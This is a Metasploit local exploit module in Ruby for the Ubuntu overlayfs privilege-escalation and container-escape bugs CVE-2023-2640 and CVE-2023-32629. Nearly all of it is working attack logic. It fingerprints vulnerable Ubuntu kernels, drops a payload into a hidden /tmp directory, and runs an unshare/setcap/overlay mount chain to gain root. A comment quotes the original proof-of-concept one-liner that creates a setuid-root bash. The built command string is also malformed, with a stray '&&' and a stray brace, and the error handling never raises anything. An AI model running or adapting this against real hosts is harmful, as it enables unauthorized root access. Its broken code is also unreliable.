class MetasploitModule < Msf::Exploit::Local
 
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Post::File
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GameOver(lay) Privilege Escalation and Container Escape',
        'Description' => %q{
            This module exploits the use of unsafe functions in a number of Ubuntu kernels 
            utilizing vunerable versions of overlayfs. To mitigate CVE-2021-3493 the Linux 
            kernel added a call to vfs_setxattr during ovl_do_setxattr. Due to independent 
            changes to the kernel by the Ubuntu development team __vfs_setxattr_noperm is 
            called during ovl_do_setxattr without calling the intermediate safety function 
            vfs_setxattr. Ultimatly this module allows for root access to be achieved by 
            writing setuid capabilities to a file that are not santiized after being unioned 
            with the upper mounted directory. 
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'g1vi', # PoC
          'h00die', # Module Suggestion
          'gardnerapp', # MsF Module
        ],
        'Platform' => ['linux'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'DisclosureDate' => '2023-07-26',
        'References' => [
          ['URL', 'https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/'],
          ['URL', 'https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629'],
          ['URL', 'https://www.cvedetails.com/cve/CVE-2023-2640/'],
          ['URL', 'https://www.cvedetails.com/cve/CVE-2023-32629/'],
          ['URL', 'https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability'],
          ['CVE', '2023-32629'],
          ['CVE', '2023-2640']
        ],
        'Targets' => [
          # TODO add linux sillicon
          [ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ],
          [ 'Linux x64', { 'Arch' => ARCH_X64, 'Platform' => 'linux' } ],
          [ 'Python', { 'Arch' => ARCH_PYTHON, 'Platform' => 'python' } ]
        ],
        'DefaultTarget' => 0
      )
    )
    register_options [
      OptString.new('PayloadFilename', [true, 'Name of payload file', 'marv.elf'])
    ]
    register_advanced_options [
      OptString.new('UploadDir', [true, 'Directory where the payload will be uploaded to.', '/tmp'])
    ]
  end

  def vuln
    # Keys are ubuntu versions, vals is list of vunerable kernels
    {
        "Lunar Lobster": %w[6.2.0], # Ubuntu 23.04
        "Kinetic Kudu": %w[5.19.0], # Ubuntu 22.10
        "Jammy Jellyfish": %w[5.19.0 6.2.0], # Ubuntu 22.04 LTS
        "Focal Fossa": %w[5.4.0], # Ubuntu 20.04 LTS 
        "Bionic Beaver": %w[5.4.0], # Ubuntu 18.04 LTS      
    }.transform_keys! {|k| k.to_s} # w/o this key will be :"Bionic Beaver" 
  end 

  def check
    fail_with(Failure::NotVulnerable, 'Target is not linux') unless session.platform == 'linux'

    # Must be Ubuntu 
    fail_with(Failure::NotVulnerable, "Target is not Ubuntu.") unless kernel_version =~ /[uU]buntu/ 


    unless userns_enabled?
      return CheckCode::Safe "Unprivileged usernamespaces aren't permitted"
    end 

    vprint_good "Unprivileged usernames are permitted"

    os = cmd_exec "cat /etc/os-release"

    # grab codename i.e. Focal Fossa
    codename = os.scan(/\(\w* \w*\)/)[0]

    # Remove '(' and ')'
    codename.delete_prefix!('(').delete_suffix!(')')

    print_status "Detected Ubuntu version: #{codename}"

    # uname -r
    # yields something like 5.4.0-1018-blah
    kernel = kernel_release
    print_status "Detected kernel version: #{kernel}"

    # Make sure release is running vunerable kernel
    # will this return in correct context??
    # could scan kernel to prevent looping if return below doesn't work
    vuln[codename].each do |version|
        if kernel.include? version  
            return CheckCode::Vulnerable "#{codename} with #{kernel} kernel is vunerable"
        end 
    end
  end

  def exploit
    # Still need to figure out if meterpreter or shell can interact with the spawned process 
    # So we can run a shell without having to drop a new executable
    print_status "Running exploit..."

    dir = datastore['UploadDir'].to_s

    Failure::BadConfig("Upload dir is not writeable") unless writable?(dir)

    payload_dir = "#{dir}/.#{rand_text_alphanumeric(4..20)}/"

    # make sure dir doesn't already exist
    Failure::BadConfig("#{payload_dir} already exists") if file_exist? payload_dir

    mkdir payload_dir
    register_dir_for_cleanup payload_dir

    print_status "DEBUG: payload = #{payload}"

    payload = payload_dir + datastore['PayloadFilename']
    register_file_for_cleanup payload

    # Upload payload
    write_file payload, generate_payload


    # run shell in a different namespace, add setuid capabilities and create a new mount point 
    # Based on g1vi exploit: "unshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;\" && u/python3 -c 'import os;os.setuid(0);os.system(\"cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash\")'" 
    hack = "unshare -rm sh -c \"mkdir l u w m && cp #{payload} l/; setcap cap_setuid+eip l/#{payload}; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; && chmod 4755 /u/#{payload} && /u/#{payload} && rm -rf l/ m/ u/ w/ #{payload} }"
    print_status("Running exploit #{hack}")
    cmd_exec hack
  end

end
